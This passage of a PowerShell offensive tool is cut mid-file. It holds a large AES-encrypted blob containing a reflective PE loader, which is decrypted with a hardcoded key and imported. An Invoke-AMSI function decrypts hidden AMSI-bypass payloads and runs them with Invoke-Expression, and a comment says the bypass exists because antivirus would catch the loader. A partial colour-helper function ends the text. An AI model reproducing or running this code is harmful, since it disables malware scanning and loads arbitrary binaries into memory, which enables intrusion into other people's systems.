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"

    # AMSI bypass as the reflective loader indeed will be catched by AV
    Invoke-AMSI | out-Null

    # Decrypt the encrypted reflective loader and import it in the powershell process
    $entryDecrypted = Invoke-AESEncryption -Mode Decrypt -Key "foobar" -Text $ReflectiveLoader
    $entryCompressed = $([System.Convert]::FromBase64String($entryDecrypted))
    $entryDecompressed = Get-DecompressedByteArray -byteArray $entryCompressed
    $plainPayload = [System.Text.Encoding]::ASCII.GetString($entryDecompressed)
    Invoke-PSHExecute -Code $plainPayload -Action Import

    try {

        if ($argument) {
            $exeargs = [string]$arguemnts
            write-host -ForegroundColor red "[Invoke-PEExecute] Unfortunately the reflective loader has trouble with passed arguemnts...sorry!"
        }
        Write-Verbose "[Invoke-PEExecute] Trying to start the provided PE binary file..."
        Invoke-ReflectiveLoader -PEBytes $asByte #-ExeArgs $exeargs
        
    }
    catch {
        Throw "[Invoke-PEExecute] Error loading the provided PE binary. $_"
    }
}

function Invoke-AMSI {
    <#
    .DESCRIPTION
    Plays with AMSI in Powershell and .NET.
    
    .PARAMETER PSHOnly
    Plays AMSI in Powershell only. Does not touch the complete AMSI thing which would cover .NET too.
    #>
    param (
        [Parameter(Mandatory = $false)]
        [switch] $PSHOnly
    )

    <# Some AMSI Things :-)
    Example how to build this
        $b0 = [io.file]::ReadAllBytes((resolve-path "amsi.txt"))
        $b1 = Get-CompressedByteArray -byteArray $b0
        $b2 = [System.Convert]::ToBase64String($b1)
        $b3 = Invoke-AESEncryption -Mode Encrypt -Key "foobar" -Text $b2
        Now use the content of $b3 as content for the specific $payload below
    #>

    $payloadPSH = "tXcCpb/ADCdUpvizNlqTAbVSYHKbC1Pl47Smgq69A4F3sNw/L+gG9NGaopTUQijBbOpbHT8vtyGhJqFzqONiev0LGQ4+IVWGf06V8bd/wOtEE4toJ54h8XTgpY18etNBoQQVAgw2yfhJZvJ/7GnECEt/I/gaG0P9zOx8j4xHg9WRP5OvS19i/9JTwmij8CzDR2A6GsWdf/k/E64KhgWLSSmSbmmUabH+1axPDNvjA4Gykzc+8q8o+w2h7lq3f+6wNxPTxS5ZIDr8UXO1qt+YvOY9YjvAwNJIDpTgkfPTiwZmGJv9P5qvl0bEsCn/F4GSMXh8v+mK4x/U4A4X6Ya7Bji/+f1P/0vnhpY8ePZhgyXw7p31aEESndSiD0FGCbzTXHKBUiKz1AotZRBUrGxA+7cO3JDlFfPTqkDxpA70MHqHTJZN3xcCJI/4L7YKK94j392GphaxYTd14LN/cVb1coRWCqvvJrXfJ9XGt/wYNYk="
    $payloadNET = "GzC6ZdZhMPFvDYjU9oXfz4//VzaEqKSABGxLiyqD34SvfiPBRjizPLsxHHprkUkukqPmsj8ZEUnqrEW4x16nm7pLXkYpurddDFmpa9Gavdm+Tlgr7nPJrbNRPeBbII/Xd2GTWHL9hYqn/joqx+iAuZrpP2oG817h+KW1PwiNznu/jm5NXWMCaQs94UCzXjlb2HwsQD5tVqzeYX77bsvn8Lq5xvfOcZef+VZNa4MIvj+EBFWR2CYGmgW5yolSRjtKOwAH5vS/oTnER52P2UZkOWmqQO6ww2lmGGtnnVlREq1k2goLDudbhp4PwcS6bzofha8SPHPomRH0eEGg5xdRjMcsrQl5eRF2yOdjs4sjQ6iPaadRAB5XTdzZkekHMiBn4tEqQjkhDadyUnBCz9Qg6nJ02RhnJWfy2UHH07fluQecWvTPb9uFklkVGvePn8zpIHnaJLxskLdRzcml8GKJ3PaZDxw5SROMKhJJllU+z8kptJmLNcrzKBOTLSkvl4s2S/QZhSoob2pVyVJ7A187f4E8bBOg1uFjCxlkcbCi8GC2s/gH1VAq+W9RQYo/l71gAPZo4eNqy28QKYCiAwmE0MoWVRyCarikr6+xCcd2H5XyN5igovbend3WVjgcNW/O/BXNi9+e+XLSdP3XwOXC4so6AyJv3USfFdRL6KKXIZW82s86lQHoq4b+lRjk6iCD6NIhnGsWKyAfOYY42V/TeKMjkov01ZFV2jmov61iIXzRbEy3NEjdiPCqsSr6Ib1B2mDtWD4Ims4GgC19fHMMmH0532f+H31Is1tH2uBlfdZ//inmL3Y8zK7AO3C4YVKsas3OSDcqtVaVpumAxecxbqeQc123oux7rI0D8fqXRDcZim12OOlXQR3sAYQlwaoK9VW77TRlF/qY6I+N7lS2sanOeupoD0y3wpUtzNQFD0D6m5qGCYzrXcwhsrKR5UZ/3rKPRSFWq3EaFg1zoYs+uZdSFG7ynK1AxI96zSIvrwv/T8OUArGuEUsA/a3yg7qn"

    $payload = @()
    if ($PSHOnly) {
        $payload += $payloadPSH
    } else {
        $payload += $payloadPSH
        $payload += $payloadNET
    }

    try {
        Write-Host "Trying to play with AMSI..."
        foreach ($entry in $payload) {
            $entryDecrypted = Invoke-AESEncryption -Mode Decrypt -Key "foobar" -Text $entry
            $entryCompressed = $([System.Convert]::FromBase64String($entryDecrypted))
            $entryDecompressed = Get-DecompressedByteArray -byteArray $entryCompressed
            $plainPayload = [System.Text.Encoding]::ASCII.GetString($entryDecompressed)
            Invoke-Expression -Command $plainPayload | Out-Null
        }
        return

    } catch {
        Write-Host "AMSI bypass was not successful: $_"
    }
}

function Get-ANSI {
    <#
    .DESCRIPTION
    Helper function. Create ANSI color codes and clipy logo.
    
    .PARAMETER Color
    ANSI color you want to use. Possible values are:
    "RedYellow", "Black", "Red", "Green", "Yellow", "Blue", "Magenta", "Cyan", "LightGrey", "DarkGrey"

    .PARAMETER Value
    Text value as string you want to get returned with color.

    .PARAMETER Logo
    Returns the clipy logo.
    #>
    param (
        [Parameter(Mandatory=$true)]
        [ValidateSet("RedYellow", "Black", "Red", "Green", "Yellow", "Blue", "Magenta", "Cyan", "LightGrey", "DarkGrey")]
        [string] $Color,

        [Parameter(Mandatory=$true)]
        [string] $Value,

        [Parameter(Mandatory = $false)]
        [Switch] $Logo
    )

    BEGIN {
        # Set ANSI escape sequence for colored output
        $ANSI_esc = [char]27
        $ANSI_Table = @{
        "RedYellow" = $ANSI_esc+"[1;31;103m"
        "Black" =  $ANSI_esc+"[1;30m"
        "Red" = $ANSI_esc+"[1;31m"
        "Green" =  $ANSI_esc+"[1;32m"
        "Yellow" =  $ANSI_esc+"[1;33m"
